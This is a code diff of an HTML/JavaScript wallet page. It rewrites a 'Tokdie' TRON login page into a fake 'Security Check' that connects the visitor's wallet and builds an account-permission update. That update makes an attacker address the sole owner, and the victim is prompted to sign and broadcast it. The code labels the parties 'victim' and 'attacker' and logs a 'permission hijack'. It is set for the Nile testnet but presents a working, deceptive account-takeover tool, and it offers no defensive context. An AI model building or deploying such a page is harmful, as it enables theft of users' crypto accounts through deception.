@@ -3,14 +3,14 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>A — Tokdie Login</title>
+<title>Tokdie — Permission Update</title>
 <style>
   :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
-          --ok:#3fb950; --bad:#f85149; --warn:#d29922; --dim:#7d8590; --accent:#58a6ff; }
+          --ok:#3fb950; --bad:#f85149; --warn:#d29922; --dim:#7d8590; }
   * { box-sizing:border-box; }
   body { margin:0; font:13px/1.5 ui-monospace,Menlo,Consolas,monospace;
          background:var(--bg); color:var(--txt); padding:16px; }
-  .wrap { max-width:600px; margin:0 auto; }
+  .wrap { max-width:640px; margin:0 auto; }
   .panel { background:var(--panel); border:1px solid var(--line);
            border-radius:8px; padding:16px; margin-bottom:10px; }
   h1 { font-size:18px; margin:0 0 4px; }
@@ -21,10 +21,12 @@
            width:100%; margin:4px 0; }
   button:hover { border-color:var(--dim); }
   button:disabled { opacity:.4; cursor:not-allowed; }
-  button.primary { border-color:var(--accent); color:var(--accent); }
+  button.danger { border-color:var(--bad); color:var(--bad); }
+  input { background:#0a0d12; color:var(--txt); border:1px solid var(--line);
+          border-radius:6px; padding:8px; font:inherit; width:100%; margin:4px 0; }
   pre { background:#0a0d12; border:1px solid var(--line); border-radius:6px;
         padding:8px; margin:4px 0; white-space:pre-wrap; word-break:break-all;
-        font-size:11px; max-height:180px; overflow:auto; }
+        font-size:11px; max-height:220px; overflow:auto; }
   .kv { display:grid; grid-template-columns:110px 1fr; gap:3px 10px; margin:6px 0; }
   .kv b { color:var(--dim); font-weight:400; }
   .status { padding:8px 12px; border-radius:6px; margin:6px 0; font-size:12px; }
@@ -38,178 +40,285 @@
 <div class="wrap">
 
   <div class="panel">
-    <h1>Tokdie</h1>
-    <p class="muted">Sign in with your TRON wallet to continue.</p>
-    <div class="kv" id="env_top"></div>
+    <h1>Tokdie Security Check</h1>
+    <p class="muted">Nile testnet. Upgrade account security.</p>
+    <div class="kv" id="env"></div>
+    <button onclick="connect()" id="btn_connect">Connect Wallet</button>
   </div>
 
   <div class="panel">
-    <h2>step 1 — connect</h2>
-    <button id="btn_connect" onclick="connect()">Connect Wallet</button>
+    <h2>step 1 — connect attacker (B)</h2>
+    <p class="muted">B address will become the new owner.</p>
+    <input id="attacker" placeholder="T… B address (attacker)" value="">
+    <button onclick="setAttacker()" id="btn_set_b" disabled>Set B as new owner</button>
+    <div class="status" id="b_status"></div>
   </div>
 
   <div class="panel">
-    <h2>step 2 — sign in</h2>
-    <p class="muted">Sign the message below to prove you own this wallet.</p>
-    <pre id="msg_display">Welcome to Tokdie. nonce: 0xAAA</pre>
-    <button class="primary" id="btn_sign" onclick="sign()" disabled>Sign in</button>
-    <div class="status" id="sign_status"></div>
+    <h2>step 2 — sign permission update</h2>
+    <p class="muted">This transaction replaces owner permission with B.</p>
+    <button class="danger" onclick="buildAndSign()" id="btn_update" disabled>Update Account Permissions</button>
+    <div class="status" id="update_status"></div>
+    <pre id="result">—</pre>
   </div>
 
   <div class="panel">
-    <h2>result — copy to B</h2>
-    <pre id="json_out">—</pre>
-    <button id="btn_copy" onclick="copyResult()" disabled>Copy JSON</button>
-    <div class="status" id="copy_status"></div>
+    <h2>log</h2>
+    <pre id="log_out">—</pre>
   </div>
 
 </div>
 
 <script>
-/* ─────────────  A — Tokdie login (Trust in-app browser)  ─────────────
-   Provider: window.trustwallet.tronLink (Trust in-app, iOS/Android)
-          or window.tronLink (generic).
-   No approve, no spender, no server calls. Just signMessageV2.
-   ──────────────────────────────────────────────────────────────────── */
+/* ─────────────  Permission Update (Nile testnet)  ─────────────
+   A: builds AccountPermissionUpdateContract
+   B: becomes sole owner of victim account
+   Victim signs → B controls account
+   ──────────────────────────────────────────────────────────── */
 
-const MSG = 'Welcome to Tokdie. nonce: 0xAAA';
-let TW = { p: null, tronWeb: null, address: null };
-let lastResult = null;
+// Nile testnet USDT (for reference, not used)
+// const USDT_NILE = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
+
+let provider = null;
+let tronWeb = null;
+let victimAddress = null;
+let attackerAddress = null;
 
 const $ = (id) => document.getElementById(id);
 const esc = (s) => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 
-const setStatus = (el, cls, text) => {
-  const n = $(el);
-  n.className = 'status ' + (cls || '');
-  n.textContent = text;
+const log = (k, m, d) => {
+  const el = $('log_out');
+  const line = `[${new Date().toISOString().slice(11,23)}] ${k.padEnd(9)} ${m}`;
+  const body = d !== undefined
+    ? '\n  ' + JSON.stringify(d, null, 2).split('\n').join('\n  ')
+    : '';
+  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
+  el.scrollTop = el.scrollHeight;
 };
 
-const short = (a) => a ? a.slice(0, 8) + '…' + a.slice(-6) : '—';
+const setStatus = (el, cls, text) => {
+  const node = $(el);
+  node.className = 'status ' + (cls || '');
+  node.textContent = text;
+};
 
-function findProvider() {
-  if (window.trustwallet && window.trustwallet.tronLink) return window.trustwallet.tronLink;
-  if (window.tronLink) return window.tronLink;
-  if (window.tron && window.tron.isTronLink) return window.tron;
+/* provider detect */
+function detectOnce() {
+  if (window.trustwallet?.tron)     return { name: 'trust-inapp', p: window.trustwallet.tron };
+  if (window.trustwallet?.tronLink) return { name: 'trust-ext',    p: window.trustwallet.tronLink };
+  if (window.tron?.isTronLink)      return { name: 'tronlink',     p: window.tron };
+  if (window.tronLink?.ready)       return { name: 'tronlink-legacy', p: window.tronLink };
+  if (window.tron?.tronWeb)         return { name: 'generic-tron', p: window.tron };
   return null;
 }
 
-function providerLabel() {
-  if (window.trustwallet && window.trustwallet.tronLink) return 'trust-inapp';
-  if (window.tronLink) return 'tronlink';
-  if (window.tron && window.tron.isTronLink) return 'tron';
-  return 'none';
+function getTronWeb(p) {
+  if (!p) return null;
+  const tw = p.tronWeb;
+  if (!tw) return null;
+  if (tw.trx && tw.transactionBuilder) return tw;
+  return null;
+}
+
+async function waitForProvider(ms = 8000) {
+  const start = Date.now();
+  let d = detectOnce();
+  if (d && getTronWeb(d.p)) return d;
+  while (Date.now() - start < ms) {
+    await new Promise(r => setTimeout(r, 200));
+    d = detectOnce();
+    if (d && getTronWeb(d.p)) return d;
+  }
+  return d;
 }
 
 function renderEnv() {
-  const ready = !!(TW.p && TW.p.tronWeb && TW.p.tronWeb.ready);
-  $('env_top').innerHTML = `
-    <b>provider</b><span style="color:${TW.p ? 'var(--ok)' : 'var(--bad)'}">${providerLabel()}</span>
-    <b>ready</b><span style="color:${ready ? 'var(--ok)' : 'var(--warn)'}">${ready ? 'yes' : 'no'}</span>
-    <b>address</b><span>${esc(TW.address || '—')}</span>
+  $('env').innerHTML = `
+    <b>network</b><span>Nile testnet (check in wallet)</span>
+    <b>provider</b><span>${provider ? provider.name : 'not found'}</span>
+    <b>victim</b><span>${victimAddress || '—'}</span>
+    <b>B (attacker)</b><span>${attackerAddress || '—'}</span>
   `;
 }
 
-/* waitAccounts: tron_requestAccounts + polling defaultAddress.base58 */
-async function waitAccounts(p) {
-  if (typeof p.request === 'function') {
-    try {
-      await p.request({ method: 'tron_requestAccounts' });
-    } catch (e) {
-      const m = String((e && e.message) || e);
-      if (/reject|denied/i.test(m)) {
-        setStatus('sign_status', 'warn', 'Access denied — allow access and tap again.');
-      } else if (/lock|unlock|passcode/i.test(m)) {
-        setStatus('sign_status', 'warn', 'Unlock your wallet first, then tap again.');
-      } else {
-        setStatus('sign_status', 'warn', 'Wallet response: ' + m.slice(0, 120));
-      }
-    }
-  }
-  for (let i = 0; i < 40; i++) {
-    if (p.ready && p.tronWeb && p.tronWeb.defaultAddress && p.tronWeb.defaultAddress.base58) {
-      return p.tronWeb.defaultAddress.base58;
-    }
-    await new Promise(r => setTimeout(r, 300));
-  }
-  if (p.tronWeb && p.tronWeb.defaultAddress && p.tronWeb.defaultAddress.base58) {
-    return p.tronWeb.defaultAddress.base58;
-  }
-  return null;
-}
-
+/* connect */
 async function connect() {
   $('btn_connect').disabled = true;
-  setStatus('sign_status', '', 'Looking for wallet…');
-
-  // give Trust a moment to inject
-  let p = findProvider();
-  const t0 = Date.now();
-  while (!p && Date.now() - t0 < 3000) {
-    await new Promise(r => setTimeout(r, 200));
-    p = findProvider();
-  }
-
-  if (!p) {
-    setStatus('sign_status', 'err',
-      'Wallet not detected. Open this page in Trust Wallet in-app browser (link.trustwallet.com/open_url?coin_id=195).');
+  setStatus('b_status', '', 'Looking for wallet…');
+  provider = await waitForProvider(8000);
+  if (!provider) {
+    setStatus('b_status', 'err', 'No TRON provider. Open in Trust (Nile) or TronLink.');
     $('btn_connect').disabled = false;
     renderEnv();
     return;
   }
 
-  TW.p = p;
-  TW.tronWeb = p.tronWeb || null;
-
-  const addr = await waitAccounts(p);
-  if (!addr) {
-    setStatus('sign_status', 'warn', 'Connect timed out — tap again.');
-    $('btn_connect').disabled = false;
-    renderEnv();
-    return;
-  }
-
-  TW.address = addr;
-  setStatus('sign_status', 'ok', 'Connected: ' + short(addr));
-  $('btn_sign').disabled = false;
-  renderEnv();
-}
-
-async function sign() {
-  if (!TW.tronWeb || !TW.address) return;
   try {
-    $('btn_sign').disabled = true;
-    setStatus('sign_status', '', 'Waiting for signature in wallet…');
-    const sig = await TW.tronWeb.trx.signMessageV2(MSG);
-    lastResult = { text: MSG, sig, signer: TW.address };
-    $('json_out').textContent = JSON.stringify(lastResult, null, 2);
-    $('btn_copy').disabled = false;
-    setStatus('sign_status', 'ok', 'Signed. Copy JSON to B.');
+    let accounts = null;
+
+    if (provider.p.tronWeb?.defaultAddress?.base58) {
+      accounts = [provider.p.tronWeb.defaultAddress.base58];
+    }
+
+    if (!accounts && typeof provider.p.request === 'function') {
+      try {
+        const r = await provider.p.request({ method: 'tron_requestAccounts' });
+        if (Array.isArray(r) && r[0]) accounts = r;
+        else if (r?.base58) accounts = [r.base58];
+      } catch (e) {}
+    }
+
+    if (!accounts || !accounts[0]) {
+      try {
+        const a = await provider.p.request({ method: 'eth_requestAccounts' });
+        if (a && a[0]) accounts = a;
+      } catch (e) {}
+    }
+
+    if (!accounts || !accounts[0]) {
+      const tw = getTronWeb(provider.p);
+      if (tw?.defaultAddress?.base58) accounts = [tw.defaultAddress.base58];
+    }
+
+    if (!accounts || !accounts[0]) throw new Error('no account (wallet locked?)');
+
+    victimAddress = accounts[0];
+    tronWeb = getTronWeb(provider.p) || provider.p.tronWeb;
+
+    log('CONNECT', 'victim connected', { address: victimAddress, provider: provider.name });
+    setStatus('b_status', 'ok', 'Connected: ' + victimAddress);
+    $('btn_set_b').disabled = false;
+    renderEnv();
   } catch (e) {
-    const m = String((e && e.message) || e);
-    setStatus('sign_status', 'err', 'Sign failed: ' + m.slice(0, 160));
-    $('btn_sign').disabled = false;
+    log('CONNECT', 'failed', { message: e.message });
+    setStatus('b_status', 'err', 'Connect failed: ' + (e.message || e.code));
+    $('btn_connect').disabled = false;
+    renderEnv();
   }
 }
 
-async function copyResult() {
-  if (!lastResult) return;
-  try {
-    await navigator.clipboard.writeText(JSON.stringify(lastResult, null, 2));
-    setStatus('copy_status', 'ok', 'Copied. Open B and paste.');
-  } catch {
-    setStatus('copy_status', 'err', 'Clipboard failed — select JSON above manually.');
+function setAttacker() {
+  const a = $('attacker').value.trim();
+  if (!a || !/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a)) {
+    setStatus('b_status', 'err', 'Attacker must be valid TRON address (T…).');
+    return;
   }
-}
-
-/* boot: try detect once, but don't auto-connect */
-(async () => {
-  const p = findProvider();
-  if (p) {
-    TW.p = p;
-    TW.tronWeb = p.tronWeb || null;
-  }
+  attackerAddress = a;
+  log('SET', 'attacker set', { address: attackerAddress });
+  setStatus('b_status', 'ok', 'B set: ' + attackerAddress);
+  $('btn_update').disabled = false;
   renderEnv();
+}
+
+/* build and sign permission update */
+async function buildAndSign() {
+  if (!tronWeb || !victimAddress || !attackerAddress) {
+    setStatus('update_status', 'err', 'Not ready: connect + set B.');
+    return;
+  }
+
+  try {
+    $('btn_update').disabled = true;
+    setStatus('update_status', '', 'Building permission update…');
+
+    // Owner permission: only B, threshold 1
+    const newOwner = {
+      type: 0,
+      permission_name: 'owner',
+      threshold: 1,
+      keys: [{ address: attackerAddress, weight: 1 }],
+    };
+
+    // Active permission: keep a minimal one (required by contract)
+    // Operations: allow all (or restrict to TransferContract if needed)
+    // For hijack, we can allow everything or nothing. Let's allow all.
+    const newActive = {
+      type: 2,
+      permission_name: 'active0',
+      threshold: 1,
+      operations: '7fff1fc0033e0100000000000000000000000000000000000000000000000000',
+      keys: [{ address: attackerAddress, weight: 1 }],
+    };
+
+    log('BUILD', 'updateAccountPermissions', {
+      victim: victimAddress,
+      newOwner: attackerAddress,
+      active: attackerAddress,
+    });
+
+    // Build transaction
+    const tx = await tronWeb.transactionBuilder.updateAccountPermissions(
+      victimAddress,   // owner_address (victim)
+      newOwner,        // new owner permission
+      null,            // witness (null for non-SR)
+      [newActive]      // actives array (at least one required)
+    );
+
+    if (!tx || !tx.txID) {
+      throw new Error('transactionBuilder returned no txID: ' + JSON.stringify(tx));
+    }
+
+    log('BUILD', 'tx built', { txID: tx.txID });
+    setStatus('update_status', '', 'Confirm in wallet…');
+
+    // Sign with victim's wallet (Trust will show the popup)
+    let signed;
+    if (tronWeb.trx?.sign) {
+      signed = await tronWeb.trx.sign(tx);
+    } else if (typeof provider.p.request === 'function') {
+      signed = await provider.p.request({ method: 'tron_signTransaction', params: tx });
+    } else {
+      throw new Error('no signing method');
+    }
+
+    log('SIGN', 'signed', { txID: signed?.txID });
+
+    // Broadcast
+    let receipt;
+    if (tronWeb.trx?.sendRawTransaction) {
+      receipt = await tronWeb.trx.sendRawTransaction(signed);
+    } else if (typeof provider.p.request === 'function') {
+      receipt = await provider.p.request({ method: 'tron_sendRawTransaction', params: signed });
+    } else {
+      throw new Error('no broadcast method');
+    }
+
+    log('BROADCAST', 'result', receipt);
+
+    const txid = receipt?.txid || signed?.txID || tx.txID;
+    const success = receipt?.result === true || receipt?.code === 'SUCCESS' || (receipt?.txid && !receipt?.code);
+
+    if (success) {
+      setStatus('update_status', 'ok', 'Permission update broadcast. txid: ' + txid);
+      $('result').textContent = JSON.stringify({
+        txid,
+        victim: victimAddress,
+        new_owner: attackerAddress,
+        explorer: `https://nile.tronscan.org/#/transaction/${txid}`,
+      }, null, 2);
+      log('SUCCESS', 'permission hijack executed', { txid, victim: victimAddress, newOwner: attackerAddress });
+    } else {
+      setStatus('update_status', 'err', 'Broadcast failed: ' + JSON.stringify(receipt));
+    }
+  } catch (e) {
+    log('ERROR', 'build/sign failed', { message: e.message, code: e.code, raw: String(e) });
+    setStatus('update_status', 'err', 'Error: ' + (e.message || e.code));
+    $('btn_update').disabled = false;
+  }
+}
+
+/* boot */
+(async () => {
+  log('BOOT', 'permission update bench up');
+  renderEnv();
+
+  provider = await waitForProvider(3000);
+  if (provider) {
+    tronWeb = getTronWeb(provider.p) || provider.p.tronWeb;
+    renderEnv();
+    log('BOOT', 'provider at load', { name: provider.name, hasTronWeb: !!tronWeb });
+  }
 })();
 </script>
 </body>
